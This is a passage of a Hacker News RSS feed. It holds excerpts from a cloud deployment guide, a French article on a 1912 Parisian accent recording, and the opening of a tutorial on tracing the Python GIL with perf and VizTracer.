<li><a href="https://developer.arm.com/documentation/dui0475/h/the-arm-c-and-c---libraries/c---initialization--construction-and-destruction">https://developer.arm.com/documentation/dui0475/h/the-arm-c-and-c---libraries/c---initialization--construction-and-destruction</a></li>
<li><a href="https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array">https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array</a></li>
</ul>
<pre>      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
      <span>KEEP</span><span>(</span><span>*</span><span>(.</span><span>init</span><span>))</span>
      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
  …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thea.codes/the-most-thoroughly-commented-linker-script/">https://blog.thea.codes/the-most-thoroughly-commented-linker-script/</a></em></p>]]>
            </description>
            <link>https://blog.thea.codes/the-most-thoroughly-commented-linker-script/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775854</guid>
            <pubDate>Thu, 14 Jan 2021 13:06:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Create and Share stunning images of source code (CodeKeep Shots)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25775810">thread link</a>) | @jp1016
<br/>
January 14, 2021 | https://codekeep.io/screenshot | <a href="https://web.archive.org/web/*/https://codekeep.io/screenshot">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://codekeep.io/screenshot</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775810</guid>
            <pubDate>Thu, 14 Jan 2021 13:00:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Big Little Guide to Running Code in the Cloud(s)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25775783">thread link</a>) | @sudhirj
<br/>
January 14, 2021 | https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/ | <a href="https://web.archive.org/web/*/https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
                <p>As software developers, we've come a long way... from fighting over limited time slices of lab computing, we've arrived at being able to instantly deploy and run code on servers in hundreds of edge data-centers in cities all over the world. This guide evaluates some of the cloud computing options that have become available over two decades—we'll cover the offerings from the three major cloud providers, along with a few other companies building interesting options. </p><p>The common stages of application development are <em>writing</em> code, <em>packaging</em> code, <em>deploying</em> and <em>running</em> code. In this guide we'll talk about advances in <em>packaging</em>, <em>deploying</em> and <em>running</em> code. We'll also cover the basics of the infrastructure required to connect our applications to the rest of the internet, like load-balancers, request protocols and routing. We <em>won't</em> be looking at databases, data storage, <a href="https://sudhir.io/the-big-little-guide-to-message-queues/">message queues</a>, and other advances here—these are all massive topics that deserve their own separate guides. We'll be looking at three kinds of service providers: <em>IaaS</em> or <em>infrastructure-as-a-service</em>, <em>PaaS</em> or <em>platform-as-a-service</em>, and <em>FaaS</em> or <em>functions-as-a-service</em>. </p><p>An <em><strong>IaaS,</strong></em> or <em>infrastructure-as-a-service</em> system gives you all the basic building blocks necessary to run your application, and asks you to make all the decisions about how your application should run—and also do all the work required to setup, configure, maintain and monitor it. The building blocks might have some loose integrations with each other, but you'll have to do most of the wiring to make them work together. </p><p>A <strong><em>PaaS</em></strong>, or <em>platform-as-a-service</em> system makes a lot of those decisions for you, and does a lot of the work itself. The servers are already configured correctly and high-performance request routing and monitoring is taken care of. Operational maintenance is also handled for you, with the PaaS employing a highly trained team of engineers on a 24/7/365 pager duty schedule to make sure everything is running according to your choices. All you need to do is submit the application, configure it, and make a few strategic choices about how you want things to work. </p><p>A <em><strong>FaaS</strong></em>, of <em>functions-as-a-service</em> system, works very differently. Your application is <em>not</em> a stand-alone system here—it's a smaller piece of code that fits tightly into a much larger framework offered by the FaaS system. It cannot run independently—it needs to follow the technology, dependency, packaging, deployment and execution rules of the FaaS, and it can run only in the context of that FaaS. In exchange for conforming to these tight rules the FaaS offers you something that's very hard, if not impossible, to achieve using any other kind of system. We'll cover what “magic” a FaaS provides, along with what the tradeoffs are and how to reduce their impact on your work. </p><h2 id="simple-iaas">Simple IaaS </h2><p>The simplest way to deploy an application on the cloud is to rent one server and deploy it there. AWS has <a href="https://aws.amazon.com/ec2/">EC2</a>, Google has <a href="https://cloud.google.com/compute">Compute Engine</a>—Azure doesn't bother with a marketing department and just puts everyone in sales, so they just call them <a href="https://azure.microsoft.com/en-in/services/virtual-machines/">Virtual Machines</a>. As Azure very helpfully points out, these servers are all <em>virtual machines</em>. They're real servers with CPU, RAM, disks and networking installed in a data-center building somewhere, and they're either rented out to you as a whole, or split into smaller sections using <em>virtualization</em> hardware and software—hence the term “virtual” machines. This splitting is invisible to you, the customer—you'll see each virtual section that you rent as a complete, isolated, fully functioning machine. There's a lot of incredible engineering that goes into doing this securely <em>and</em> with high-performance—if you're interested the <a href="https://aws.amazon.com/ec2/nitro/">AWS Nitro System</a> is worth reading up on.</p><p>Your server needs to be reachable on the internet, so the first thing it'll have is an <a href="https://en.wikipedia.org/wiki/IPv4">IP address</a>. These are a pretty scarce resource, though—represented as four numbers from 0 to 255, there are only 4,294,967,296 (256 x 256 x 256 x 256) possible addresses, out of which fewer are usable and available. So the cloud providers will usually either give you any available address, or allow you to reserve one—often for free if you're actually using it, but at extra charges if you're squatting without using it. AWS calls this <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/elastic-ip-addresses-eip.html">Elastic IP</a>, and Google calls it “<a href="https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address">Reserving a static external IP address</a>”, because they're probably in the process of moving everyone from marketing into sales. You probably already guessed what Azure <a href="https://azure.microsoft.com/en-in/blog/reserved-ip-addresses/">calls it</a>. There's also support rolling out for a newer larger address format called <a href="https://en.wikipedia.org/wiki/IPv6">IPv6</a> that's four times longer and has more addresses than all the grains of sand on a billion earths—but that will take a little longer before it's fully adopted. We'll revisit IPv6 addressing again when we talk about more interesting deployment options.</p><p>Once we have an IP address, we log into the machine using SSH, install our code <em>package</em>, which can be as simple as a zip file for interpreted languages (like Ruby, Python or PHP), or a specially formatted zip file like <a href="https://en.wikipedia.org/wiki/JAR_(file_format)">JAR</a> or <a href="https://en.wikipedia.org/wiki/WAR_(file_format)">WAR</a> (Java &amp; JVM), or a compiled binary (Go, C++). We then complete the process of <em>deployment</em> by installing any dependencies or language runtimes we need, and run the application with a <a href="https://www.linux.com/training-tutorials/understanding-and-using-systemd/">process</a> <a href="http://smarden.org/runit/">manager</a> so it stays running after we log out or restart. </p><p>We can then point a domain name, like <em>www.example.com</em>, at the IP address of our server has using the <a href="https://en.wikipedia.org/wiki/Name_server">name-servers</a> provided by company that we registered the domain name with. Or we could use the DNS name-servers offered by the cloud providers, which promise better performance all over the world. AWS has <a href="https://aws.amazon.com/route53/">Route53</a> (named after the default port for a DNS name-server, which is 53), Google has <a href="https://cloud.google.com/dns">Cloud DNS</a> and Azure just has <a href="https://docs.microsoft.com/en-us/azure/dns/dns-overview">DNS</a>. Using the cloud providers is helpful because they've got servers deployed all over the word, and DNS speeds make a big difference in how fast your application works for users everywhere. Route53 has a few advantages here—besides just answering the question of which IP address is serving a particular domain name, it also gives you the option to tailor that answer based on where the user is, letting you send them to a deployment that's close to them. This assumes that you have a global application that's deployed in multiple places across the world, of course. <a href="https://www.cloudflare.com/">Cloudflare</a> is also an excellent DNS provider—they also have a deployment offering that we'll cover later.</p><p>Along with some extra work that I really hope you do, like OS firewalls and OS hardening, this completes a basic application server setup on the cloud. The cloud providers helpfully provide services to manage basic network security around your server, like AWS <a href="https://aws.amazon.com/vpc/">VPC</a>, Google <a href="https://cloud.google.com/vpc/docs/firewalls">VPC</a>, or Azure <a href="https://azure.microsoft.com/en-in/services/virtual-network/">Virtual Network</a>. All of these will allow you to selectively open and close ports with allow/block rules that be scoped to IP addresses; or scoped to another group of similarly managed servers (often called a <em>security group</em>). There are also pre-hardened cloud-specific OS distributions like <a href="https://aws.amazon.com/amazon-linux-2/">Amazon Linux</a> available for free use.</p><p>To see what's going on with your application, or <em>monitor</em> it, you could always log in to the machine and read, or <em>tail</em>, the logs. But there's another building block that cloud companies will give you—a tool to ingest logs, set up alerts and dashboards on them and archive them if necessary. AWS <a href="https://aws.amazon.com/cloudwatch/">CloudWatch</a>, Google <a href="https://cloud.google.com/logging">Cloud Logging</a>, and Azure <a href="https://docs.microsoft.com/en-us/azure/azure-monitor/overview">Monitor</a> all provide these features, usually charging based on the quantity of logs you ingest into them and how long you hold them for. Each of them have different features, but as a starting point it'll make sense to just use whatever is available with your chosen platform. Each platform's logging tool will usually also handle native metrics for you—you'll be able to make a dashboard of server CPU usage, disk utilization, or any other metric that the cloud provider tracks natively. If you need more than this, companies like <a href="https://www.datadoghq.com/">Datadog</a>, <a href="https://www.sumologic.com/">Sumo Logic</a>, <a href="https://newrelic.com/">New Relic</a>, <a href="https://www.elastic.co/what-is/elk-stack">Elastic</a> and many others can also help.</p><h2 id="protocols-encryption">Protocols &amp; Encryption</h2><p>Before move on to more complex deployments, it's important to review what kinds of incoming requests our applications might be dealing with in the first place. The common protocols we use are:</p><ul><li><strong>UDP</strong>, where <a href="https://en.wikipedia.org/wiki/User_Datagram_Protocol">packets</a> of information are sent to an IP address with no expectation of acknowledgement.</li><li><strong>TCP</strong>, which <a href="https://searchnetworking.techtarget.com/definition/TCP">builds</a> on <em>UDP</em> to create the concept of a <em>connection</em>, where the sender and receiver work with ordered packets of information that are all acknowledged—this gives the sender and receiver the impression of having a 2-way reliable sequential stream on which to exchange raw bytes.</li><li><strong>HTTP/1</strong>, which <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Evolution_of_HTTP">builds</a> on <em>TCP</em> to add the concept of a <em>request</em> and <em>response.</em> A <em>request</em> is sent to a human readable address, called a URL, with <em>headers</em> that act as key-value metadata and an optional <em>body</em> of bytes. Each request gets a response, with the same format of headers and body. Each request &amp; response runs on one TCP connection.</li><li><strong>WebSocket</strong>, which <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSocket"></a><a href="https://www.ably.io/topic/websockets">builds</a> on TCP to provide a similar 2-way ordered data stream, but instead of raw bytes the protocol allows for distinct messages to be sent. Each message is either received as a whole, or the connection is considered to have failed. WebSocket is a companion protocol to HTTP, and a HTTP connection is often transformed (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism">technically</a> <em>upgraded</em>) into a WebSocket.</li><li><strong>HTTP/2</strong>, which builds on <em>TCP</em> and offers the same features as HTTP/1, <a href="https://www.digitalocean.com/community/tutorials/http-1-1-vs-http-2-what-s-the-difference">but with better</a> performance, connection <em>multiplexing</em> (more than one HTTP request-response exchanges can happen simultaneously on the same TCP connection), header compression, and preemptive data <a href="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/">pushing</a> from the server.</li><li><strong>gRPC</strong>, which <a href="https://grpc.io/"></a><a href="https://grpc.io/docs/what-is-grpc/core-concepts/"></a><a href="https://grpc.io/docs/what-is-grpc/core-concepts/">builds</a> on <em>HTTP/2</em> to offer remote procedure calls—a way for clients to call functions on servers, identified by URI, with an input and output exchanged in predetermined binary formats.</li><li><strong>HTTP/3 + QUIC</strong>, which builds on <em>UDP</em> and offers the same features as HTTP/2 but <a href="https://blog.cloudflare.com/http3-the-past-present-and-future/"></a><a href="https://blog.cloudflare.com/http3-the-past-present-and-future/">better</a>.</li><li><strong>TLS/SSL</strong>, which isn't a standalone protocol, but a <a href="https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/">way to encrypt</a> and secure TCP and all the protocols that are built on it (which is all of them except …</li></ul></div></article></main></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/">https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/</a></em></p>]]>
            </description>
            <link>https://sudhir.io/the-big-little-guide-to-running-code-in-the-clouds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775783</guid>
            <pubDate>Thu, 14 Jan 2021 12:57:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parisian Accent in 1912]]>
            </title>
            <description>
<![CDATA[
Score 300 | Comments 157 (<a href="https://news.ycombinator.com/item?id=25775091">thread link</a>) | @paganel
<br/>
January 14, 2021 | https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912 | <a href="https://web.archive.org/web/*/https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>"C’est extraordinaire que j’aie une voix aussi traînarde, jamais je l’aurais cru ! On ne s’entend pas, absolument !" Dans ce document unique en son genre, un Parisien réagit à l'écoute de son propre accent, celui du 14e arrondissement, en 1912. Il est interviewé par le linguiste Ferdinand Brunot. </p><div>
            <p>Cette archive exceptionnelle est l’une des premières interviews sonores, le premier enregistrement d'un échange spontané, non lu. C’est aussi l’une des rares traces de l’accent parisien d’avant-guerre. En 1912, le linguiste Ferdinand Brunot veut enregistrer les dialectes des artisans. Ici, c’est le parler parisien qui l’intéresse, l’accent populaire des différents quartiers de la capitale. Louis Ligabue, tapissier dans le 14e arrondissement, a alors 37 ans, et note déjà l'embourgeoisement de son quartier.</p>

<h2>Le parler d'un pur "Parisien de Paris"</h2>
<p>Le linguiste Ferdinand Brunot, fondateur des "Archives de la parole"&nbsp;en 1911, est l'un des rares universitaires de son temps à s'intéresser à l'enregistrement du français parlé&nbsp;"commun". Pour lui, le "parler parisien" est une forme de dialecte dont il faut garder la trace. Chaque quartier de la capitale est censé présenter ses spécificités linguistiques&nbsp;: on ne parle pas à Montrouge comme à Montmartre. Or pour <a target="_blank" rel="noopener" href="https://gallica.bnf.fr/blog/11052020/quand-un-parisien-entend-pour-la-premiere-fois-le-son-de-sa-voix?mode=desktop">Pascal Cordereix</a>, responsable du service des documents sonores à la BnF, "<em>ce 'dialecte' parisien renvoie lui-même à l’un des plus grands mythes de la linguistique romane parisienne de la fin du XIXe siècle, à savoir le "françien", un supposé dialecte d’Île-de-France dans lequel le français trouverait sa seule origine. On est là au cœur de la construction jacobine de la langue française mise en œuvre après 1870, opposant définitivement français et autres idiomes parlés sur le territoire.</em>"</p>
<p><em>Ferdinand Brunot interviewe Louis Ligabue en 1912&nbsp;:&nbsp;</em></p>


<p>- Vous êtes vraiment, vous monsieur, un Parisien de Paris&nbsp;?&nbsp;</p>
<p><em>-</em> Je suis né à Paris même, boulevard Sébastopol et j’ai monté du côté de Montrouge, rue Daguerre. Ensuite, j’ai été avenue d’Orléans. J’ai travaillé dans le quartier constamment. Je ne l’ai jamais quitté du reste.&nbsp;</p>
<p>- Et vous êtes exclusivement tapissier, alors&nbsp;?&nbsp;</p>
<p>- Absolument. (...) et je travaille pour le client personnel (...)</p>
<p>- Vous êtes exclusivement dans la clientèle bourgeoise&nbsp;?&nbsp;</p>
<p>- Oui, monsieur.</p>
<p>- Il y a eu beaucoup d’installations de ce côté-là, ce doit être un bon métier&nbsp;?</p>
<p><em>-</em> Ah le quartier a beaucoup gagné. Nous avons depuis quelques années travaillé admirablement.</p>
<p>- J’ai entendu dire que vous n’étiez pas payé très régulièrement...</p>
<p>- Oh vous savez, le 14e est tout à fait spécial. Nous avons de bons clients, de bons bourgeois, et puis régulièrement, on hésite à donner une affaire... Mais quant au règlement, jamais nous ne perdons quoi que ce soit.&nbsp;</p>
<p>- On m’avait dit au contraire que rue Alphonse Daudet, il y avait une clientèle peu recommandable...</p>
<p>- Ah dame ! Ça, je m’en réjouis bien !</p>
<h2>Entendre sa propre voix</h2>
<p>Ce document est unique à plus d'un titre&nbsp;: c’est aussi la première fois qu’on entend quelqu’un réagir à ses propos, à sa voix. &nbsp;Dans la foulée de l’interview, Louis Ligabue s’écoute, et s’étonne, toujours en dialoguant avec le linguiste Ferdinand Brunot. <a target="_blank" rel="noopener" href="https://gallica.bnf.fr/blog/11052020/quand-un-parisien-entend-pour-la-premiere-fois-le-son-de-sa-voix?mode=desktop">Pascal Cordereix</a>, spécialiste du fonds sonore ancien à la Bibliothèque nationale de France (BnF)&nbsp;: "<em>On connaît beaucoup de récits écrits d’un enregistrement et de la surprise du locuteur s’écoutant parler. Mais à notre connaissance, Ferdinand Brunot est le seul, avant longtemps, à avoir l’idée de graver ainsi sur disque les réactions du témoin à l’écoute de sa propre voix.</em>"</p>
<p><strong>Ferdinand Brunot interviewe Louis Ligabue en 1912&nbsp;:&nbsp;</strong></p>
<p>- Eh bien, vous avez entendu ce que vous avez dit. Vous êtes-vous reconnu&nbsp;?&nbsp;</p>
<p>- Oui, parfaitement monsieur !</p>
<p>- N’est-ce pas que c’est bien votre voix&nbsp;?&nbsp;</p>
<p>- C’est parfait, parfait, c’est même très très curieux ! C’est très drôle, il me semble même que c’est extraordinaire que j’aie une voix si traînarde, jamais je ne l’aurais cru ! On ne s’entend pas, absolument !&nbsp;</p>
<p>- Vous n’avez pas la voix traînarde, vous avez tout simplement l’accent de Paris, c’est justement ça que je veux enregistrer.&nbsp;</p>
<p>- Ah ça aujourd'hui j’en suis convaincu, bien des gens m’ont dit des fois&nbsp;: “Comme il traîne ce garçon dans sa conversation”. Ben, je disais non, pourtant, il me semble que c’est tout naturel&nbsp;; mais alors là, vous savez, j’ai un accent presque d’La Villette on dirait…</p>
<p>- La Villette&nbsp;? Ne croyez-vous pas qu’il y a une grande différence justement entre l’accent de La Villette et le vôtre&nbsp;?</p>
<p>- Ah peut-être, je ne sais pas…</p>
<p>- Vous qui êtes de Paris, est-ce que vous ne reconnaissez pas justement quelqu’un qui est de nos arrondissements&nbsp;?</p>
<p>- Ah absolument, si, il y a réellement des différences.</p>
<p>- Quelqu’un qui s’est beaucoup occupé de ça me disait par exemple qu’il reconnaissait du premier coup un habitant du 14e et un habitant de Montmartre.</p>
<p>- Ah peut-être, mais enfin, il me semble que c’est une étude assez sérieuse.</p>
<p>- Oui, il y a des gars qui imitent ça étonnamment et à volonté vous savez, ils se transforment en gens de Montparnasse, ou en gens de Montmartre comme ils veulent.</p>
<p>- Ah oui, on voit ça dans les revues, là, dans les concerts, là&nbsp;; on a des types spéciaux là-dessus.</p>
<p>- Oui. Est-ce que dans la rue de la Gaîté, là, il y a des gens qui imitent justement l’accent du quartier&nbsp;?</p>
<p>- Ah y en a, y en a. Mais alors, ça devient peut-être un peu en exagération. Tandis que là, moi, je cause naturellement, et quand j’écoute, il me semble que j’exagère… Je suis bien content, vous savez, d’avoir jugé et ça m’a bien intéressé !</p>
<p>- Et bien je vous remercie de vous être prêté à l’expérience.</p>
<p>- De rien.</p>
<h2>Les Archives de la parole à découvrir sur Gallica</h2>
<p>Archive conservée à la Bibliothèque nationale de France. Merci au service Son du département de l’Audiovisuel, BnF et au Service de la coopération numérique et de Gallica, BnF. Archives de la Parole, conservation&nbsp;: BnF, Département de l’Audiovisuel, service Son.</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-ferdinand-brunot-1911-1914">Les Archives de la parole, 1911-1914</a></li>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-jean-poirot-enregistrements-la-sorbonne">Les Archives de la parole, 1920-1924</a></li>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-musee-de-la-parole-et-du-geste-hubert-pernot-1924-1930">Les Archives de la parole, 1924-1930</a></li>
</ul>



    </div></div>]]>
            </description>
            <link>https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775091</guid>
            <pubDate>Thu, 14 Jan 2021 11:26:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracing and visualizing the Python GIL with perf and VizTracer]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25774945">thread link</a>) | @maartenbreddels
<br/>
January 14, 2021 | https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html | <a href="https://web.archive.org/web/*/https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>

<p>There are plenty of articles explaining why the Python GIL (The Global Interpreter Lock) exists<sup id="fnref-1"><a href="#fn-1">1</a></sup>, and why it is there. The TLDR version is: the GIL prevents multithreaded pure Python code from using multiple CPU cores.</p>
<p>However, in <a href="https://vaex.io/">Vaex</a> we execute most of the CPU intensive parts in C (C++) code, where we release the GIL. This is a common practice in high-performance Python libraries, where Python acts merely as a high-level glue.</p>
<p>However, the GIL needs to be released explicitly, and this is the responsibility of the programmer and might be forgotten, leading to suboptimal use of your machine.</p>
<p>I recently had this issue in <a href="https://github.com/vaexio/vaex/pull/1114">Vaex</a> where I simply forgot to release the GIL and found a similar issue in <a href="https://github.com/apache/arrow/pull/7756">Apache Arrow</a><sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Also, when running on 64 cores, I sometimes see a performance in Vaex that I am not happy with. It might be using 4000% CPU, instead of 6400% CPU, which is something I am not happy with. Instead of blindly pulling some levers to inspect the effect, I want to understand what is happening, and if the GIL is the problem, why, and where is it holding Vaex down.</p>


</div>
</div>
</div><div>
<div>
<div>

<p>I'm planning to write a series of articles explaining some tools and techniques available for profiling/tracing Python together with native extensions, and how these tools can be glued together, to analyze and visualize what Python is doing, and when the GIL it taken or dropped.</p>
<p>I hope this leads to improvement of tracing, profiling, and other performance tooling in the Python ecosystem, and the performance of the whole Python ecosystem.</p>

<h2 id="Linux">
Linux<a href="#Linux"> </a>
</h2>
<p>Get access to a Linux machine, and make sure you have root privileges (sudo is fine), or ask your sysadmin to execute some of these commands for you. For the rest of the document, we only run as user.</p>
<h2 id="Perf">
Perf<a href="#Perf"> </a>
</h2>
<p>Make sure you have perf installed, e.g. on Ubuntu:</p>

<pre><code>$ sudo yum install perf</code></pre>
<h2 id="Kernel-configuration">
Kernel configuration<a href="#Kernel-configuration"> </a>
</h2>
<p>To enable running it as a user:</p>

<pre><code># Enable users to run perf (use at own risk)
$ sudo sysctl kernel.perf_event_paranoid=-1

# Enable users to see schedule trace events:
$ sudo mount -o remount,mode=755 /sys/kernel/debug
$ sudo mount -o remount,mode=755 /sys/kernel/debug/tracing</code></pre>
<h2 id="Python-packages">
Python packages<a href="#Python-packages"> </a>
</h2>
<p>We will make use of <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> and <a href="https://github.com/maartenbreddels/per4m">per4m</a></p>

<pre><code>$ pip install "viztracer&gt;=0.11.2" "per4m&gt;=0.1,&lt;0.2"</code></pre>

</div>
</div>
</div><div>
<div>
<div>

<p>There is no way to get the GIL state in Python <sup id="fnref-3"><a href="#fn-3">1</a></sup> since there is no API for this. We can track it from the kernel, and the right tool for this under Linux is <strong>perf</strong>.</p>
<p>Using the linux perf tool (aka perf_events), we can listen to the state changes for processes/threads (we only care about sleeping and running), and log them. Although perf may look scary, it is a powerful tool. If you want to know a bit more about perf, I recommend reading <a href="https://jvns.ca/blog/2018/04/16/new-perf-zine/">Julia Evans' zine on perf</a> or <a href="http://www.brendangregg.com/perf.html">go through Brendan Gregg's website</a>.</p>
<p>To build our intuition, we will first run perf on a <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example0.py">very trivial program</a>:</p>


</div>
</div>
</div><div>
<div>
<div>
<p>We listen to just a few events to keep the noise down (note the use of wildcards):</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork \
        -e 'sched:sched_wak*' -- python -m per4m.example0
[ perf record: Woken up 2 times to write data ]
[ perf record: Captured and wrote 0,032 MB perf.data (33 samples) ]</code></pre>
<p>And use the <code>perf script</code> command to write human/parsable output.</p>

<pre><code>$ perf script
        :3040108 3040108 [032] 5563910.979408:                sched:sched_waking: comm=perf pid=3040114 prio=120 target_cpu=031
        :3040108 3040108 [032] 5563910.979431:                sched:sched_wakeup: comm=perf pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995616:                sched:sched_waking: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995618:                sched:sched_wakeup: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995621:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995622:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995624:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R+ ==&gt; next_comm=kworker/31:1 next_pid=2502104 next_prio=120
          python 3040114 [031] 5563911.003612:                sched:sched_waking: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.003614:                sched:sched_wakeup: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.083609:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083612:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083613:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R ==&gt; next_comm=ksoftirqd/31 next_pid=198 next_prio=120
          python 3040114 [031] 5563911.108984:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.109059:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.112250:          sched:sched_process_fork: comm=python pid=3040114 child_comm=python child_pid=3040116
          python 3040114 [031] 5563911.112260:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112262:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112273:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112418:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112450:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112473: sched:sched_wake_idle_without_ipi: cpu=31
         swapper     0 [031] 5563911.112476:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112485:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112485:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112489:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112496:                sched:sched_switch: prev_comm=python prev_pid=3040116 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/37 next_pid=0 next_prio=120
         swapper     0 [031] 5563911.112497:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
         swapper     0 [037] 5563912.113490:                sched:sched_waking: comm=python pid=3040116 prio=120 target_cpu=037
         swapper     0 [037] 5563912.113529:                sched:sched_wakeup: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040116 [037] 5563912.113595:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563912.113620:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
         swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></pre>

</div>
</div>
</div><div>
<div>
<div>
<p>Take a moment to digest the output. I can see a few things. Looking at the 4th column (time in seconds), we can see where the program slept (it skips 1 second). Here we see that we enter the sleeping state with a line like:</p>
<p><code>python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120</code></p>
<p>This means the kernel changed the state of the Python thread to <code>S</code> (=sleeping) state.</p>
<p>A full second later, we see it being woken up:</p>
<p><code>swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></p>
<p>Of course, you need to build some tooling around this, to really see what is happening. But one can imagine this output can be easily parsed and this is what <a href="https://github.com/maartenbreddels/per4m/">per4m</a> does. However, before we go there, I'd first like to visualize the flow of a slightly more advanced program using <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a>.</p>

</div>
</div>
</div><div>
<div>
<div>

<p><a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> is a Python tracer that can visualize what your program does in the browser. Let us run it on a slightly <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example1.py">more advanced example</a> to see what it looks like.</p>

</div>
</div>
</div><div>
<div>
<div>
<p>Running viztracer gives output like:</p>

